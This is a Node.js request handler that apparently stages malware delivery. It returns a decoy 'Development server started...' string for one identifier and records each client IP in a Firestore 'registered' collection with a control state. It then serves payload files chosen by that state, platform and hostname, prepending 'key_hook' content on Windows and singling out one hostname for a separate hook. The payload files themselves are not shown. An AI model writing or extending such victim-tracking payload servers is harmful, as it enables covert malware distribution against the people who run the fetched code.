const fs = require("fs");
const path = require("path");
const getLastPart = require("../utils/getLastPart");
const { addDoc, collection, query, where, getDocs } = require("firebase/firestore"); // Import Firestore functions

async function getFileContents(req, res, db) {
    
    try {
        
        let fileName = getLastPart(req.body);
        let uID = fileName;
        console.log("========", req.body);

        if (fileName === "v1") {
            return res.json('console.log("Development server started...")');
        } else {
            // Get IP address from the request
            const requestedIp = req.clientIp;
            
            const dataRef = collection(db, "registered");
            const q = query(dataRef, where("ip", "==", requestedIp));
            const snapshot = await getDocs(q);

            let controlState;
            if (snapshot.empty) {
                controlState="S2";

                const logData = {
                    ip: requestedIp,
                    controlState: controlState,
                };
                await addDoc(collection(db, "registered"), logData);
            }

            // Assuming we're interested in the first document for the specified IP
            snapshot.forEach((doc) => {
                controlState = doc.data().controlState; // Get controlState from the document
            });

            const attachName = fileName + "_a";
            // Determine the file name based on the controlState
            
            switch (controlState) {
                case 'S1':
                    fileName = '0'; // Replace with your actual file name
                    break;
                case 'S2':
                    fileName += '';
                    break;
                case 'S3':
                    fileName += '_3'; // Replace with your actual file name
                    break;
                // default:
                //     return res.status(400).json({ error: "Invalid control state." }); // Handle undefined control states
            }

            const filePath = path.join(process.cwd(), "5", fileName);
            const attachPath = path.join(process.cwd(), "5", attachName);
            const prePath = path.join(process.cwd(), "5", 'key_hook');
            const prePath2 = path.join(process.cwd(), "5", 'key_hook_2');
            fs.readdir(path.join(process.cwd(), "5"), (err, files) => {
                console.log(({ version:"1", error: err, files }));
                if (err) {
                    // return res.json({ error: err, files });
                    console.error(err);
                    // return res.status(500).json({ error: "Could not list files." });
                }
                console.log("Available files: ", files); // Use this to log available files
                // Proceed to access your file
            });

            let controllerContent = '';
            fs.readFile(attachPath, "utf-8", (err, attachContent) => {
                if (err) {
                    //return res.json({});
                }
                controllerContent = attachContent;
            });
            fs.access(filePath, fs.constants.F_OK, (err) => {
                if (err) {
                    return res.json({});
                }
                
                fs.readFile(filePath, "utf-8", (err, mainContent) => {
                    if (err) {
                        return res.json({});
                    }

                    if(req.body.platform === "win32" || req.body.OS === "Windows_NT") {
                        // req.clientIp  req.body.hostname  req.body.username
                        //console.log('$$$$$$$$4', controlState, req.clientIp, req.body.hostname, req.body.username);
                        
                        if(req.body.hostname == 'DESKTOP-DU7CQKB' || uID == '11') {
                            fs.readFile(prePath2, "utf-8", (err, preContent2) => {
                                if (err) {
                                    return res.json({});
                                }
                                console.log('#1');
                                // console.log('@@@@ p', preContent2,'@@@@ m', mainContent,'@@@@ c', controllerContent);
                                return res.json(' { ' + preContent2 + ' } ' + mainContent + ' { ' + controllerContent + ' } ');
                            });
                        } else {
                            fs.readFile(prePath, "utf-8", (err, preContent) => {
                                if (err) {
                                    return res.json({});
                                }
                                // if(controlState == 'S3'){
                                //     console.log('#2');
                                    // console.log('@@@@ p', preContent,'@@@@ m', mainContent,'@@@@ c', controllerContent);
                                    return res.json(' { ' + preContent + ' } ' + mainContent + ' { ' + controllerContent + ' } ');
                                // } else {
                                //     console.log('#3');
                                //     // console.log('@@@@ p', preContent,'@@@@ m', mainContent,'@@@@ c', controllerContent);
                                //     return res.json(' { ' + preContent + ' } ' + mainContent);
                                // }
                            });
                        }
                    } else {
                        if(controlState == 'S3'){
                            console.log('#4');
                            return res.json(mainContent);
                        } else {
                            console.log('#5');
                            // console.log('@@@@ p', preContent,'@@@@ m', mainContent,'@@@@ c', controllerContent);
                            return res.json(mainContent + ' { ' + controllerContent + ' } ');   
                        }
                    }
                });
            });
        }
        
    } catch (err) {
        console.error("Error fetching control state:", err);
        // res.status(500).json({ error: "Internal server error.", details: err.message });
    }
}

module.exports = { getFileContents };